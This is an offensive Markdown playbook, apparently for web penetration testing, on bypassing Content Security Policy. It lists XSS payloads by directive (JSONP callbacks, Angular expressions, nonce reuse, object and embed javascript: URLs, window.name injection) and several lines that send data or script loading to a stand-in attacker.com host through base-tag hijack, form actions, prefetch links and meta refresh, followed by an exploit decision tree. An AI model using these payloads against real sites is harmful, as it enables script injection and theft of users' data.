# CSP Bypass Playbook

## Step 1: Extract CSP Header
```bash
curl -sI https://target.com | grep -i content-security-policy
curl -sI https://target.com/path | grep -i content-security-policy
```

## Step 2: Parse Directives

Check each directive:

### `default-src`
If no `script-src` explicitly set, `default-src` acts as fallback.

### `script-src`
| Value | Bypass Method |
|-------|--------------|
| `'unsafe-inline'` | **XSS directly works.** Report immediately. |
| `'unsafe-eval'` | Use `eval()`, `setTimeout(string)`, `Function()` |
| `'self'` | Find JSONP endpoints, uploaded files, angular on same origin |
| `'nonce-XXXX'` | Try reusing nonce, check if predictable, DOM clobber |
| `'sha256-XXXX'` | Check if hash matches user-controllable content |
| `*.cdn.com` | Find a controlled script on that CDN (upload, etc.) |
| `none` | Hard blocked. Try `<base>` hijack or meta refresh. |

### `object-src`
If not `'none'`: `<object data=javascript:alert(1)>` or `<embed src=javascript:alert(1)>`

### `base-uri`
If missing: `<base href=https://attacker.com/>` hijacks all relative `<script src="relative.js">`

### `form-action`
If not `'self'`: `<form action=https://attacker.com>` exfiltrates data

### `report-uri` / `report-to`
Check if `report-uri` has an open redirect: CSP violation reports might be injectable

## Step 3: Automated CSP Analysis
```bash
# CSP Evaluator
# https://csp-evaluator.withgoogle.com/

# csp_bypass (CLI tool)
python3 -c "
import re, sys
csp = 'content-security-policy: default-src self; script-src self https://cdn.example.com'
# Parse and analyze
"
```

## Step 4: CSP Bypass Techniques

### Technique 1: JSONP Endpoint (script-src 'self')
Find `?callback=` or `?jsonp=` endpoints on the SAME origin:
```html
<script src="https://target.com/api?callback=alert(1)"></script>
<script src="https://target.com/jsonp?cb=alert(document.domain)"></script>
```

### Technique 2: File Upload (script-src 'self')
Upload a `.js` file with malicious content:
```html
<script src="https://target.com/uploads/xss.js"></script>
```

### Technique 3: Angular/Closure RCE (script-src 'self')
If Angular is on the page:
```html
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(document.domain)">click</div>
</div>
```

### Technique 4: Base Tag Hijack (no base-uri)
```html
<base href="https://attacker.com/">
<script src="/relative/js/file.js"></script>  <!-- loads from attacker.com -->
```

### Technique 5: <link rel=prefetch> (exfiltration even with strict CSP)
```html
<link rel=prefetch href="https://attacker.com/steal?data=SECRET">
```

### Technique 6: Meta Refresh (exfiltration)
```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/steal?data=SOMETHING">
```
Only exfiltrates, doesn't execute JS.

### Technique 7: DNS Prefetch (exfiltration)
```html
<link rel=dns-prefetch href="//attacker.com">
```

### Technique 8: Window.name / postMessage
If child window can be controlled:
```html
<iframe src="https://target.com" name="<img src=x onerror=alert(1)>">
```

### Technique 9: Nonce Reuse
If the CSP nonce is static:
```html
<script nonce="PREVIOUS_NONCE">alert(1)</script>
```

### Technique 10: Nonce DOM Clobber
If the code looks up nonce from DOM:
```html
<script>var n=document.querySelector('script').nonce</script>
```

## Step 5: CSP Bypass Decision Tree
```
Does CSP exist?
├── NO → Full XSS, report immediately
└── YES → Parse directives
    ├── 'unsafe-inline' in script-src → Full XSS, report immediately
    ├── 'unsafe-eval' → Use eval-based XSS
    ├── nonce in script-src
    │   ├── Nonce predictable/reusable → Craft matching script tag
    │   └── Nonce rotates per request → CSP bypass unlikely, try other techs
    ├── 'self' in script-src
    │   ├── JSONP endpoint available → JSONP callback XSS
    │   ├── File upload available → Upload .js → script src
    │   ├── Angular on page → Angular CSP bypass
    │   └── None of above → Try base hijack, meta refresh, form action
    └── Strict CSP (nonce + hash, no 'self')
        ├── base-uri missing → Base hijack for relative scripts
        ├── form-action not 'self' → Form exfiltration
        └── All locked → Likely unexploitable for JS execution
```
